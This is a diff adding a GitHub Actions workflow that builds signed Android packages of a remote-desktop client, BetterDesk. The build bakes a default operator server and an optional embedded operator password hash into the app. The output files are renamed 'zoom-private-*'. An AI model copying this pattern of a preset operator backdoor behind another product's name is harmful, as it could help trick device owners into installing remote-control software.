@@ -1,0 +1,247 @@
+name: Build BetterDesk Android (APK + signed AAB)
+
+on:
+  workflow_dispatch:
+    inputs:
+      operator_host:
+        description: "Operator webconsole host clients connect to"
+        required: true
+        default: "panel.telcom.stream"
+      operator_port:
+        description: "Operator webconsole port (API/WSS)"
+        required: true
+        default: "443"
+      embedded_password_hash:
+        description: "Optional pre-computed PBKDF2 hash (salt:hash) for operator access"
+        required: false
+        default: ""
+      use_https:
+        description: "Use HTTPS/WSS"
+        required: true
+        default: "true"
+      source_ref:
+        description: "Commit/ref to build (blank = default)"
+        required: false
+        default: ""
+      release_tag:
+        description: "Existing GitHub release tag to attach APKs to (blank = artifact only)"
+        required: false
+        default: ""
+      release_repo:
+        description: "owner/repo that owns the release (needs RELEASE_PAT for another repo)"
+        required: false
+        default: "fingod201-maker/BetterDesk"
+
+permissions:
+  contents: write
+
+env:
+  FLUTTER_VERSION: "3.24.5"
+  RUST_VERSION: "stable"
+  ANDROID_COMPILE_SDK: "36"
+  ANDROID_BUILD_TOOLS: "36.0.0"
+  ANDROID_NDK_VERSION: "27.0.12077973"
+  OPERATOR_HOST: ${{ inputs.operator_host }}
+  OPERATOR_PORT: ${{ inputs.operator_port }}
+  EMBEDDED_PASSWORD_HASH: ${{ inputs.embedded_password_hash }}
+  USE_HTTPS: ${{ inputs.use_https }}
+
+jobs:
+  build-android:
+    runs-on: ubuntu-22.04
+    steps:
+      - uses: actions/checkout@v4
+        with:
+          ref: ${{ inputs.source_ref || github.sha }}
+          submodules: recursive
+
+      - name: Set up JDK 17
+        uses: actions/setup-java@v4
+        with:
+          distribution: temurin
+          java-version: "17"
+
+      - name: Set up Rust + Android targets
+        uses: dtolnay/rust-toolchain@stable
+        with:
+          toolchain: ${{ env.RUST_VERSION }}
+      - run: rustup target add aarch64-linux-android armv7-linux-androideabi
+      - run: cargo install cargo-ndk --locked
+
+      - name: Set up Flutter
+        uses: subosito/flutter-action@v2
+        with:
+          flutter-version: ${{ env.FLUTTER_VERSION }}
+          channel: stable
+          cache: true
+
+      - name: Patch Flutter Gradle plugin for AGP 8
+        run: |
+          set -euo pipefail
+          F="$FLUTTER_ROOT/packages/flutter_tools/gradle/src/main/groovy/flutter.groovy"
+          test -f "$F"
+          sed -i 's/output\.getFilter(OutputFile\.ABI)/output.getFilter("ABI")/g' "$F"
+          sed -i '/^import com\.android\.build\.OutputFile$/d' "$F"
+          if grep -nE "com\.android\.build\.OutputFile|OutputFile\.ABI" "$F"; then
+            echo "Flutter Gradle plugin patch failed"
+            exit 1
+          fi
+          grep -n 'getFilter' "$F"
+
+      - name: Set up Android SDK + NDK
+        uses: android-actions/setup-android@v3
+        with:
+          cmdline-tools-version: "11076708"
+          packages: >-
+            platform-tools
+            platforms;android-${{ env.ANDROID_COMPILE_SDK }}
+            build-tools;${{ env.ANDROID_BUILD_TOOLS }}
+            ndk;${{ env.ANDROID_NDK_VERSION }}
+
+      - id: ndk
+        run: echo "ndk-path=$ANDROID_HOME/ndk/${{ env.ANDROID_NDK_VERSION }}" >> "$GITHUB_OUTPUT"
+
+      - name: Set up vcpkg
+        uses: lukka/run-vcpkg@v11
+        with:
+          vcpkgGitCommitId: 9e593bb18ea69cc5095e012465dcd675a822ed0d
+
+      - name: Build Rust FFI (arm64-v8a + armeabi-v7a)
+        working-directory: flutter
+        env:
+          ANDROID_NDK_HOME: ${{ steps.ndk.outputs.ndk-path }}
+        run: |
+          bash ndk_arm64.sh
+          bash ndk_arm.sh
+
+      - name: Build vcpkg deps
+        working-directory: flutter
+        continue-on-error: true
+        env:
+          ANDROID_NDK_HOME: ${{ steps.ndk.outputs.ndk-path }}
+        run: |
+          bash build_android_deps.sh arm64-v8a
+          bash build_android_deps.sh armeabi-v7a
+
+      - name: Flutter pub get
+        working-directory: flutter
+        run: flutter pub get
+
+      - name: Bake operator endpoint
+        working-directory: flutter
+        run: |
+          mkdir -p android/app/src/main/res/values
+          API_HOST="${OPERATOR_HOST/www./api.}"
+          API_HOST="${API_HOST/panel./api.}"
+          cat > android/app/src/main/res/values/betterdesk_server.xml <<EOF
+          <?xml version="1.0" encoding="utf-8"?>
+          <resources>
+            <string name="betterdesk_server_host" translatable="false">${{ env.OPERATOR_HOST }}</string>
+            <string name="betterdesk_server_port" translatable="false">${{ env.OPERATOR_PORT }}</string>
+            <string name="betterdesk_use_https" translatable="false">${{ env.USE_HTTPS }}</string>
+            <string name="betterdesk_operator_host" translatable="false">${{ env.OPERATOR_HOST }}</string>
+            <string name="betterdesk_operator_port" translatable="false">${{ env.OPERATOR_PORT }}</string>
+            <string name="betterdesk_api_host" translatable="false">${API_HOST}</string>
+            <string name="betterdesk_embedded_password_hash" translatable="false">${{ env.EMBEDDED_PASSWORD_HASH }}</string>
+          </resources>
+          EOF
+          echo "OPERATOR_HOST=${{ env.OPERATOR_HOST }}" >> "$GITHUB_ENV"
+          echo "OPERATOR_PORT=${{ env.OPERATOR_PORT }}" >> "$GITHUB_ENV"
+          echo "USE_HTTPS=${{ env.USE_HTTPS }}" >> "$GITHUB_ENV"
+          echo "EMBEDDED_PASSWORD_HASH=${{ env.EMBEDDED_PASSWORD_HASH }}" >> "$GITHUB_ENV"
+          echo "Baked operator=${{ env.OPERATOR_HOST }}:${{ env.OPERATOR_PORT }} https=${{ env.USE_HTTPS }}"
+
+      - name: Configure release signing
+        working-directory: flutter/android
+        env:
+          KEYSTORE_B64: ${{ secrets.ANDROID_KEYSTORE_BASE64 }}
+          KEY_ALIAS: ${{ secrets.ANDROID_KEY_ALIAS }}
+          KEY_PASSWORD: ${{ secrets.ANDROID_KEY_PASSWORD }}
+          STORE_PASSWORD: ${{ secrets.ANDROID_STORE_PASSWORD }}
+        run: |
+          if [ -n "${KEYSTORE_B64}" ] && [ -n "${KEY_ALIAS}" ]; then
+            echo "$KEYSTORE_B64" | base64 -d > app/upload-keystore.jks
+            printf 'storeFile=upload-keystore.jks\nkeyAlias=%s\nkeyPassword=%s\nstorePassword=%s\n' \
+              "${KEY_ALIAS}" "${KEY_PASSWORD}" "${STORE_PASSWORD}" > key.properties
+            echo "Release signing configured."
+          else
+            echo "No keystore secret - DEBUG-signed (sideload only)."
+          fi
+
+      - name: Build APKs + AAB
+        working-directory: flutter
+        run: |
+          DEF="--dart-define=OPERATOR_HOST=$OPERATOR_HOST --dart-define=OPERATOR_PORT=$OPERATOR_PORT --dart-define=USE_HTTPS=$USE_HTTPS --dart-define=EMBEDDED_PASSWORD_HASH=$EMBEDDED_PASSWORD_HASH"
+          # universal carries every shipped ABI (arm64 + armeabi-v7a + x86_64 so
+          # the same APK also runs on emulators / ChromeOS). arm64 and armeabi
+          # are built separately so /download/android?arch=arm64|arm32 serves the
+          # small per-ABI APK instead of the universal one.
+          flutter build apk --release --flavor universal --target-platform android-arm64,android-arm,android-x64 $DEF
+          flutter build apk --release --flavor arm64 --target-platform android-arm64 $DEF
+          flutter build apk --release --flavor armeabi --target-platform android-arm $DEF
+          flutter build apk --release --flavor x64 --target-platform android-x64 $DEF
+          flutter build appbundle --release --flavor universal --target-platform android-arm64,android-arm $DEF
+
+      - name: Collect artifacts
+        working-directory: flutter
+        run: |
+          set -euo pipefail
+          mkdir -p /tmp/out
+          # The app/build.gradle rename block emits zoom-private-android-<flavor>
+          # APKs; older setups may still emit app-<flavor>-release.apk. Copy
+          # whichever variant is present (gradle outputs dir or flutter-apk).
+          collect_apk() {
+            # $1 = flavor regex, $2 = destination name
+            found="$(find build/app/outputs -maxdepth 4 -iname '*.apk' 2>/dev/null \
+              | grep -Ei "$1" | head -n1)"
+            test -n "$found"
+            cp -v "$found" "/tmp/out/$2"
+          }
+          collect_apk 'universal' 'zoom-private-universal-release.apk'
+          collect_apk 'arm64' 'zoom-private-arm64-v8a-release.apk'
+          collect_apk 'armeabi-(v7a)?' 'zoom-private-armeabi-v7a-release.apk'
+          collect_apk '(^|[/-])x64' 'zoom-private-x64-release.apk'
+          aab="$(find build/app/outputs -maxdepth 4 -iname '*.aab' | grep -Ei 'universal' | head -n1)"
+          test -n "$aab"
+          cp -v "$aab" /tmp/out/zoom-private-universal-release.aab
+          # Per-flavor aliases used by the release/download pipeline and the
+          # `distro/clients/android/out/` layout consumed by adb install docs.
+          cp -v /tmp/out/zoom-private-universal-release.apk      /tmp/out/zoom-private-android-universal.apk
+          cp -v /tmp/out/zoom-private-arm64-v8a-release.apk      /tmp/out/zoom-private-android-arm64-v8a.apk
+          cp -v /tmp/out/zoom-private-armeabi-v7a-release.apk    /tmp/out/zoom-private-android-armeabi-v7a.apk
+          cp -v /tmp/out/zoom-private-x64-release.apk            /tmp/out/zoom-private-android-x64.apk
+          cd /tmp/out && sha256sum *.apk *.aab > ANDROID_CHECKSUMS.sha256
+          ls -la /tmp/out
+
+      - name: Attach Android assets to release
+        if: ${{ inputs.release_tag != '' }}
+        env:
+          GH_TOKEN: ${{ secrets.RELEASE_PAT || secrets.GITHUB_TOKEN }}
+          GH_REPO: ${{ inputs.release_repo }}
+          TAG: ${{ inputs.release_tag }}
+        run: |
+          set -euo pipefail
+          gh release view "$TAG" >/dev/null
+          # Remove legacy BetterDesk-Client-* assets if this release was renamed.
+          for old in \
+            BetterDesk-Client-universal-release.apk \
+            BetterDesk-Client-arm64-v8a-release.apk \
+            BetterDesk-Client-armeabi-v7a-release.apk \
+            BetterDesk-Client-universal-release.aab \
+            BetterDesk-Client-arm64-release.aab; do
+            gh release delete-asset "$TAG" "$old" -y || true
+          done
+          gh release upload "$TAG" \
+            /tmp/out/zoom-private-universal-release.apk \
+            /tmp/out/zoom-private-arm64-v8a-release.apk \
+            /tmp/out/zoom-private-armeabi-v7a-release.apk \
+            /tmp/out/zoom-private-x64-release.apk \
+            /tmp/out/zoom-private-universal-release.aab \
+            /tmp/out/ANDROID_CHECKSUMS.sha256 \
+            --clobber
+
+      - uses: actions/upload-artifact@v4
+        with:
+          name: betterdesk-android
+          path: /tmp/out
+          if-no-files-found: error
